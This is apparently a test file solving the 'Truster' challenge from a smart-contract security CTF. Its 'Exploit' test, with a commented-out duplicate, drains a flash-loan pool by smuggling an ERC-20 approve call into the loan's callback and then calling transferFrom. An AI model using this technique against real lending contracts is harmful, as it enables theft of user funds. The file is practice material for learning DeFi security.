const { ethers } = require('hardhat');
const { expect } = require('chai');
const { web3 } = require('@openzeppelin/test-helpers/src/setup');


describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });
    it('Exploit', async function () {
        const iface = new ethers.utils.Interface(["function approve(address sender, uint256 amount)"]);
        await this.pool.flashLoan(
            0,
            attacker.address,
            this.token.address,
            iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
        );
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    })

    // it('Exploit', async function () {
    //     const data = web3.eth.abi.encodeFunctionCall({
    //         name: 'approve',
    //         type: 'function',
    //         inputs: [{
    //             type: 'address',
    //             name: 'spender'
    //         },{
    //             type: 'uint256',
    //             name: 'amount'
    //         }]
    //     }, [attacker.address, TOKENS_IN_POOL.toString()]);

    //     await this.pool.flashLoan(0, attacker.address, this.token.address, data)
    //     await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    // });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

